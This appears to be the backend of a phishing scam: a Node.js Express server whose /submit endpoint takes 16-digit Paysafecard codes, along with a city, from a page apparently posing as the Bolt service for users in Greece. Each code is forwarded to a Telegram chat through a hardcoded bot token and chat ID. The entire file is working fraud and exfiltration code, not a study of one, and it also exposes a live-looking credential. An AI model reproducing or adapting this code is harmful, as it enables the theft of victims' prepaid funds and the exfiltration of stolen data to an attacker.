const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

// === YOUR CREDENTIALS ===
const TELEGRAM_BOT_TOKEN = "8657922544:AAEHvZPbio2Jp4g6J1Hpvxw8moCFKV3t8LU";
const TELEGRAM_CHAT_ID = "8131922175";
// =========================

const cityMap = {
    "Αθήνα": "Athens",
    "Θεσσαλονίκη": "Thessaloniki"
};

app.post('/submit', async (req, res) => {
    const { code, city } = req.body;

    if (!code || code.length < 16) {
        return res.status(400).json({ error: 'Invalid code' });
    }

    const displayCity = cityMap[city] || city || 'Unknown';

    const time = new Date().toLocaleString('en-GB', { 
        timeZone: 'Europe/Athens',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit'
    }).replace(',', '');

    const message = `🔴 New Bolt Entry!\n\n` +
                    `Site: Bolt\n` +
                    `Location: ${displayCity}\n` +
                    `Paysafecard 16 digit code: ${code}\n` +
                    `Time: ${time}`;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message
        });

        console.log(`✅ Code received from ${displayCity}`);
        res.json({ success: true });
    } catch (err) {
        console.error("Error:", err.message);
        res.status(500).json({ error: 'Telegram failed' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
